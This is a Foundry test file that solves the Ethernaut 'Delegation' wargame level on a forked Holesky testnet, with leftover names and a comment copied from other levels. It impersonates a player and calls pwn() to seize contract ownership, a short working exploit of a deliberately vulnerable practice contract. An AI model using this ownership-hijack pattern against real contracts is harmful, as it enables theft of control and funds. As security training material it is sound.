// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
// 0.8.0以上的版本会自动检查溢出，这题就解不了了

import {Test, console} from "../../lib/forge-std/src/Test.sol";
import {Vm} from "../../lib/forge-std/src/Vm.sol";
import {Delegate, Delegation} from "../../src/Ethernaut/Delegation.sol";

contract TelephoneAttack is Test {
    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("holesky"));
    }

    function testExploit() public {
        address playerAddress = 0xB3D6fac08D421164A414970D5225845b3A91F33F;
        vm.startPrank(playerAddress);
        Delegate delegate = Delegate(
            0xFFe2882E5246B78D0F5Ab5F15972d777897525e2
        );
        address(0xFFe2882E5246B78D0F5Ab5F15972d777897525e2).call(
            abi.encodeWithSignature("pwn()")
        );
        vm.stopPrank();
        assertTrue(delegate.owner() == playerAddress);
    }
}
